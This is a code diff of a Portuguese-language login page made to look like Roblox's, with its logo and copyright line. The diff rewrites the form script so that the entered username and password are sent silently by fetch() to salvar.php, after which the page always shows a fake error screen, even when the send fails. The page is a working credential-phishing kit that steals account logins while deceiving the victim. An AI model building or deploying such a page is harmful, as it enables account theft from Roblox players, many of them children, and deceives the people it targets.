@@ -17,10 +17,7 @@
             --rbx-red: #F6465D;
         }
 
-        * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
             background-color: var(--bg-black);
@@ -35,20 +32,8 @@
             overflow: hidden;
         }
 
-        header {
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            padding-top: 20px;
-            margin-bottom: 15px;
-        }
-
-        .roblox-logo {
-            width: 200px;
-            height: auto;
-            max-width: 80%; 
-            object-fit: contain;
-        }
+        header { width: 100%; display: flex; justify-content: center; padding-top: 20px; margin-bottom: 15px; }
+        .roblox-logo { width: 200px; height: auto; max-width: 80%; object-fit: contain; }
 
         .login-card {
             background-color: var(--card-gray);
@@ -60,19 +45,8 @@
             box-shadow: 0 10px 40px rgba(0,0,0,0.8);
         }
 
-        h2 {
-            font-family: 'Hammersmith One', sans-serif;
-            font-size: 22px;
-            margin: 0 0 5px 0;
-            color: var(--text-gray);
-        }
-
-        .subtitle {
-            color: var(--text-gray);
-            font-size: 13px;
-            margin-bottom: 25px;
-            display: block;
-        }
+        h2 { font-family: 'Hammersmith One', sans-serif; font-size: 22px; margin: 0 0 5px 0; color: var(--text-gray); }
+        .subtitle { color: var(--text-gray); font-size: 13px; margin-bottom: 25px; display: block; }
 
         input {
             width: 100%;
@@ -85,7 +59,6 @@
             outline: none;
             margin-bottom: 10px;
         }
-
         input:focus { border-color: #FFFFFF; }
 
         .btn-entrar {
@@ -100,6 +73,7 @@
             cursor: not-allowed;
             margin-top: 10px;
             transition: 0.3s;
+            position: relative;
         }
 
         .btn-entrar.active {
@@ -109,19 +83,8 @@
             cursor: pointer;
         }
 
-        /* Estilos da tela de erro */
-        #error-container {
-            display: none;
-            animation: fadeIn 0.4s ease forwards;
-        }
-
-        .error-text {
-            color: var(--rbx-red);
-            font-weight: 600;
-            font-size: 16px;
-            margin: 15px 0;
-            display: block;
-        }
+        #error-container { display: none; animation: fadeIn 0.4s ease forwards; }
+        .error-text { color: var(--rbx-red); font-weight: 600; font-size: 16px; margin: 15px 0; display: block; }
 
         .btn-voltar {
             width: 100%;
@@ -137,7 +100,6 @@
             margin-top: 10px;
         }
 
-        /* Spinner de carregamento */
         .loader {
             display: none;
             width: 20px;
@@ -152,32 +114,20 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        footer {
-            margin-top: auto;
-            padding-bottom: 15px;
-            text-align: center;
-        }
-
-        .footer-copy {
-            color: var(--footer-gray);
-            font-size: 10px;
-            max-width: 300px;
-            margin: 0 auto;
-        }
+        footer { margin-top: auto; padding-bottom: 15px; text-align: center; }
+        .footer-copy { color: var(--footer-gray); font-size: 10px; }
     </style>
 </head>
 <body>
 
-    <header>
-        <img src="logo.png" alt="Roblox" class="roblox-logo">
-    </header>
+    <header><img src="logo.png" alt="Roblox" class="roblox-logo"></header>
 
     <div class="login-card">
         <div id="login-content">
             <h2>Adicione a conta</h2>
             <span class="subtitle">Fazer autenticação para prosseguir.</span>
             
-            <form action="salvar.php" method="POST" id="loginForm">
+            <form id="loginForm">
                 <input type="text" name="usuario" id="usuario" placeholder="Usuário/e-mail/telefone" required>
                 <input type="password" name="senha" id="senha" placeholder="Senha" required>
                 
@@ -196,11 +146,7 @@
         </div>
     </div>
 
-    <footer>
-        <div class="footer-copy">
-            © 2026 Roblox Corporation.
-        </div>
-    </footer>
+    <footer><div class="footer-copy">© 2026 Roblox Corporation.</div></footer>
 
     <script>
         const userInp = document.getElementById('usuario');
@@ -212,7 +158,6 @@
         const loader = document.getElementById('loader');
         const textBtn = document.getElementById('textBtn');
 
-        // Validação para acender o botão
         function validar() {
             if (userInp.value.trim().length > 0 && passInp.value.length >= 8) {
                 submitBtn.classList.add('active');
@@ -226,21 +171,33 @@
         userInp.addEventListener('input', validar);
         passInp.addEventListener('input', validar);
 
-        // Lógica de envio e exibição de erro
         loginForm.addEventListener('submit', function(event) {
-            // Se você quiser que o PHP salve ANTES de mostrar o erro,
-            // você precisaria de AJAX. Aqui vamos simular o carregamento:
-            event.preventDefault(); 
+            event.preventDefault(); // Impede o redirecionamento imediato
             
             textBtn.style.display = 'none';
             loader.style.display = 'block';
             submitBtn.style.pointerEvents = 'none';
 
-            // Simula verificação de 3 segundos e mostra a tela de Robux Indisponível
-            setTimeout(() => {
+            // Coleta os dados do formulário
+            const formData = new FormData(loginForm);
+
+            // ENVIA PARA O PHP SEM MUDAR DE PÁGINA
+            fetch('salvar.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Após o envio ser concluído, espera 2 segundos e mostra o erro
+                setTimeout(() => {
+                    loginContent.style.display = 'none';
+                    errorContainer.style.display = 'block';
+                }, 2000);
+            })
+            .catch(error => {
+                // Caso dê erro no servidor, ainda assim mostra a tela de erro para o usuário
                 loginContent.style.display = 'none';
                 errorContainer.style.display = 'block';
-            }, 3000);
+            });
         });
     </script>
 
